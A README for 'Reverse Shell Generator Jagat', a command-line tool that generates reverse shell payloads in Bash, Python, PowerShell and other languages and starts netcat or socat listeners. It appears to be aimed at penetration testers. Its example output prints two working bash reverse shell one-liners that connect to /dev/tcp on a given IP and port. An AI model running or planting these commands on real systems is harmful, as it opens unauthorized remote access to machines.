# Reverse Shell Generator Jagat

## Description

The **Reverse Shell Generator Jagat** is a versatile command-line utility designed to generate multiple types of reverse shell payloads across various programming languages and tools. It aims to assist security researchers, penetration testers, and ethical hackers by providing ready-to-use reverse shell commands that can be customized with a target IP address and port number.

This tool supports a wide range of reverse shell payloads including Bash, Python, Perl, Ruby, Netcat, Socat, PowerShell, PHP, Java, Node.js, and more. It offers easy selection of the preferred shell type and includes the ability to start a listener (using netcat or socat) to receive incoming reverse shell connections.

Key features include:

- Generation of multiple reverse shell payloads tailored to a target IP and port.
- Support for different shell types and languages with the option to specify the preferred shell.
- Validation of the given IP address to ensure it matches configured network interfaces on the host machine.
- Option to launch a listener automatically after selecting a payload, using netcat or socat.
- Color-coded output for better readability of payloads and messages.
- Inclusion of reverse shell payloads compatible with Windows and Unix-like systems.
- Easy installation via a provided shell script for Unix-like environments.

***

## Usage Instructions

### Prerequisites

- A Unix-like system (Linux, macOS) with Python 3 installed.
- `socat` or `netcat` (nc) installed for listener functionality.
- Root or sudo privileges to install the tool system-wide with the provided script (optional).

### Installation

1. Clone or download all files (https://github.com/jagat-singh-chaudhary/Reverse-Shell-Generator-Jagat.git) into a directory.
2. Run the installation script as root to copy the main program to `/usr/local/bin` for easy global access:

   ```sh
   sudo sh install.sh
   ```

   This allows running the tool simply by typing:

   ```sh
   Reverse-Shell-Generator-Jagat
   ```

### Running the Tool

The basic command format is:

```sh
Reverse-Shell-Generator-Jagat <IP_ADDRESS> <PORT> [SHELL_TYPE]
```

- `IP_ADDRESS`: The target IP where the reverse shell should connect.
- `PORT`: The target port number for the connection.
- `[SHELL_TYPE]` (optional): The shell language/type for the reverse shell payload (e.g., bash, python, perl, ruby). If omitted, `bash` is used as the default.

Example usage:

```sh
Reverse-Shell-Generator-Jagat 192.168.0.10 4444
Reverse-Shell-Generator-Jagat 10.0.0.5 5555 python3
```

### What the Tool Does

- Validates that the IP address belongs to an interface on your machine.
- Reads the `shells.txt` file to gather all available reverse shell payloads.
- Filters the payloads based on the chosen or default shell type.
- Displays the reverse shell payload commands with the IP and port replaced.
- Prompts you to select a listener type:
  - Press `l` for a netcat or socat listener, depending on the shell type.
  - Press `i` for an interactive netcat listener (if applicable).
  - Press any other key to exit without launching a listener.
- If a listener is chosen, it runs the appropriate command to catch incoming shell connections.

***

## Shell Types Supported

Some of the supported shell types include (but are not limited to):

- bash
- python
- python3
- perl
- ruby
- netcat / nc
- socat
- powershell (Windows)
- php
- java
- node.js
- telnet

Each shell type has multiple payload variants to choose from, giving you flexibility based on the target system and environment.

***

## Example Output

For example, running:

```sh
Reverse-Shell-Generator-Jagat 192.168.1.10 4444 bash
```

will print multiple bash reverse shell payloads with the IP and port injected, like:

```bash
BASH REVERSE SHELL
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

BASH REVERSE SHELL
0<&196;exec 196<>/dev/tcp/192.168.1.10/4444; sh <&196 >&196 2>&196

...
```

Then it will prompt:

```
Select your payload then:

- press 'i' to attempt spawning an interactive netcat listener on port 4444,
- press 'l' to spawn a netcat listener on port 4444,
- press any other key to exit.
```

***

## Notes

- Make sure to open the relevant port(s) on firewalls.
- Use with caution and always have proper authorization before using reverse shells on networks or systems.
- The tool currently supports Linux/Unix environments natively; Windows payloads are for reference or use on compatible systems.
- Root privileges might be required for listener ports below 1024.

